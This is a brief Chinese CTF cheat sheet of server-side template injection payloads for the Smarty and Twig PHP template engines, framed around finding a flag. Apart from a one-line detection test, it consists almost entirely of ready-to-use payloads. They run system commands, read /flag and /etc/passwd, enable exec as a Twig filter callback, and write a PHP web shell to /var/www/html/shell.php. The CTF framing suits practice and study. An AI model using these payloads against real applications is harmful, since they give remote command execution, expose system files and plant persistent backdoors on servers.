CTF题解：
<https://www.cnblogs.com/bmjoker/p/13508538.html>

CTF题SSTI:
```
一个网页可以参数传参回显，XFF的IP回显，UA回显，日志回显等。
通过回显的注入点注入验证：
{{9*9}}
回显81，则存在模板注入

解题：
大多数题目的flag均藏在系统中的某个文件内
通过模板注入解析读取文件。

```


## **smarty常用注入**
```

php:
查看配置
{config}
{$smarty.version}

{system("cat ../../../../../../flag")}
{system("ls")}


{if readfile('/flag')}{/if}
{if phpinfo()}{/if}
{if system('ls')}{/if}
{if system('cat /flag')}{/if}


{self::getStreamVariable(“file:///etc/passwd”)}

```




## **twig常用的注入payload**
php7.3
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

